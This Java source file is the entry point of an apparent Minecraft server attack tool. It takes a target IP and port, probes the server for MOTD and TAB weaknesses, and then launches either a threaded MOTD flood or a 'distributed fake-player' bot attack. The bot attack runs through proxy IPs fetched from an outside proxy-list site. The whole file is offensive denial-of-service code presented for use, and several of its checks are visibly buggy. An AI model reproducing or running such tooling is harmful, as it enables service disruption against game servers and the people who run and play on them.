package me.alikomi.endminecraft;

import me.alikomi.endminecraft.data.BugData;
import me.alikomi.endminecraft.data.InfoData;
import me.alikomi.endminecraft.tasks.attack.DistributedBotAttack;
import me.alikomi.endminecraft.tasks.attack.MotdAttack;
import me.alikomi.endminecraft.tasks.scan.ScanBug;
import me.alikomi.endminecraft.tasks.scan.ScanInfo;
import me.alikomi.endminecraft.utils.HttpReq;
import me.alikomi.endminecraft.utils.Util;

import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class Main extends Util {

    public static BugData bugData;
    public static InfoData infoData;

    public static String ip;
    public static int port = 25565;

    public static void main(String[] args) throws InterruptedException {
        Scanner sc = new Scanner(System.in);
        log("请输入ip地址");
        ip = sc.next();
        if (ip.contains(":")) {
            String[] tmpip = ip.split(":");
            ip = tmpip[0];
            port = Integer.parseInt(tmpip[1]);
        } else {
            log("请输入端口（输入错误则为25565）");
            port = sc.nextInt();
        }
        infoData = new InfoData(ip, port);

        log("正在探测服务器信息，请稍后");
        ScanInfo.ScanMotdInfo(ip, port);
        log("是否开始进服前漏洞探测y/n");
        if ("y".equalsIgnoreCase(sc.next())) {
            bugData = new BugData(ip, port);
            ScanBug.scanMOTD(ip, port);
            ScanBug.scanTAB(ip, port);
            log("漏洞检测结果： ");
            log(bugData.toString());
        }

        while (true) {

            log("请输入攻击方式：");
            log("1 : MOTD攻击");
            log("2 : 分布式假人压测");
            log("========================");
                switch (sc.nextInt()) {
                    case 1 : {
                        if (bugData != null || !bugData.getMotdBug()) {
                            log("提示！！！！！！！！");
                            log("bug探测时未发现motdbug");
                        }
                        log("MOTD攻击选择");
                        log("请输入攻击时间(ms) ，1蛤=1000ms");//我就是这么暴力
                        int time = sc.nextInt();
                        int thread = sc.nextInt();
                        MotdAttack attack = new MotdAttack(ip,port,time,thread);
                        attack.startAttack();
                        break;
                    }// 1 end
                    case 2: {
                        log("分布式假人压测选择");
                        log("请选择是否开启TAB发包 y/n");
                        log("请输入攻击时长！");
                        int time = sc.nextInt();
                        log("请输入最大攻击数");
                        int maxAttack = sc.nextInt();
                        log("请输入每次加入服务器间隔");
                        int sleepTime = sc.nextInt();
                        String req =HttpReq.sendPost("http://www.89ip.cn/apijk/?&tqsl="+(maxAttack+1)+"&sxa=&sxb=&tta=&ports=&ktip=&cf=1", "");
                        List<String> ips = new ArrayList<>();
                        if (req != null && ! req.equalsIgnoreCase("")) {
                            String[] arr = req.split("<BR>");
                            int a = 0;
                            for (String index : arr) {
                                a++;
                                if (a == 1 || a== arr.length) {
                                    continue;
                                }
                                ips.add(index);
                            }
                        }else {
                            System.exit(1);
                        }
                        DistributedBotAttack distributedBotAttack = null;
                        if ("y".equalsIgnoreCase(sc.next())) {
                            distributedBotAttack = new DistributedBotAttack(ip,port,time,maxAttack,sleepTime,ips,true);
                        }else {
                            distributedBotAttack = new DistributedBotAttack(ip,port,time,maxAttack,sleepTime,ips,true);
                        }
                    }
                }

        }
    }

}
